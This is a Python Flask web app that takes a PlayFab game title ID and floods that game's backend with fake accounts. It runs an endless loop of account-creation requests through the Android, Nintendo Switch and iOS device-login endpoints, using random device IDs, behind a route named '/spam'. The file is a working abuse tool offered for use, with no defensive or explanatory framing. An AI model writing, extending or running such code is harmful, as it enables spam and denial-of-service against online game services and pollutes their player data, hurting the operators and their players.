from flask import Flask, request, render_template, jsonify
import os
import asyncio
import aiohttp
import uuid
import concurrent.futures

app = Flask(__name__)

async def loginPlayfabAccount(session, url, payload, accountType, deviceId):
    async with session.post(url, json=payload) as response:
        print(f"Sent {accountType}: {deviceId}")
        return response.status

async def verifyTitleId(titleId):
    async with aiohttp.ClientSession() as session:
        custom_id = str(uuid.uuid4())
        payload = {
            "TitleId": titleId,
            "CustomId": custom_id,
            "CreateAccount": True,
            "InfoRequestParameters": {"GetUserAccountInfo": True}
        }
        url = f"https://{titleId}.playfabapi.com/Client/LoginWithCustomID"
        async with session.post(url, json=payload) as response:
            return response.status == 200

def getAccountTypeInfo(titleId, deviceId):
    accountInfo = {
        "android": {
            "url": f"https://{titleId}.playfabapi.com/Client/LoginWithAndroidDeviceID",
            "payload": {
                "TitleId": titleId,
                "AndroidDeviceId": deviceId,
                "CreateAccount": True,
                "InfoRequestParameters": {"GetUserAccountInfo": True}
            }
        },
        "nintendo": {
            "url": f"https://{titleId}.playfabapi.com/Client/LoginWithNintendoSwitchDeviceID",
            "payload": {
                "TitleId": titleId,
                "NintendoSwitchDeviceId": deviceId,
                "CreateAccount": True,
                "InfoRequestParameters": {"GetUserAccountInfo": True}
            }
        },
        "ios": {
            "url": f"https://{titleId}.playfabapi.com/Client/LoginWithIOSDeviceID",
            "payload": {
                "TitleId": titleId,
                "DeviceId": deviceId,
                "CreateAccount": True,
                "InfoRequestParameters": {"GetUserAccountInfo": True}
            }
        }
    }
    return [(accountType, info["url"], info["payload"]) for accountType, info in accountInfo.items()]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/spam', methods=['POST'])
async def spam():
    titleId = request.form.get('titleId')
    is_valid = await verifyTitleId(titleId)
    
    if not is_valid:
        return jsonify({"message": "Invalid Title ID."}), 400
    
    async with aiohttp.ClientSession() as session:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            loop = asyncio.get_event_loop()
            while True:
                deviceId = str(uuid.uuid4())
                tasks = [
                    loop.create_task(loginPlayfabAccount(session, url, payload, accountType, deviceId))
                    for accountType, url, payload in getAccountTypeInfo(titleId, deviceId)
                ]
                await asyncio.gather(*tasks)
                await asyncio.sleep(0)  # Avoid blocking, remove or adjust as needed.
    
    return jsonify({"message": "Spamming started."})

if __name__ == '__main__':
    app.run(debug=True)
